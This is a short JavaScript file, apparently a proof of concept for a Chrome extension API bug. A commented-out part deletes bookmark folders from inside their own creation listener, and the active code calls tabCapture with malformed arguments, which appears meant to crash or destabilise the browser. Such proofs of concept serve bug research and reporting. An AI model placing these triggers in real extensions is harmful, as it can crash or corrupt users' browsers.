// async function poc(){
//     var Folder1, Folder2, Folder3, Folder4, Folder5;
// 	chrome.bookmarks.create({'parentId': "1", 'title': 'Extension bookmarks 1'},function(newFolder) {Folder1 = newFolder;});
//     chrome.bookmarks.create({'parentId': "1", 'title': 'Extension bookmarks 2'},function(newFolder) {Folder2 = newFolder;});
//     chrome.bookmarks.create({'parentId': "1", 'title': 'Extension bookmarks 3'},function(newFolder) {Folder3 = newFolder;});
//     chrome.bookmarks.create({'parentId': "1", 'title': 'Extension bookmarks 4'},function(newFolder) {Folder4 = newFolder;});

//     chrome.bookmarks.onCreated.addListener(function(res){
//         chrome.bookmarks.removeTree(Folder1.id);
//         chrome.bookmarks.removeTree(Folder2.id);
//         chrome.bookmarks.removeTree(Folder3.id);
//         chrome.bookmarks.removeTree(Folder4.id);
//     });
// }

async function poc(){
    chrome.tabCapture.capture('',function() {
        window.console('test');
    });
}
        
    //});
// }
poc();	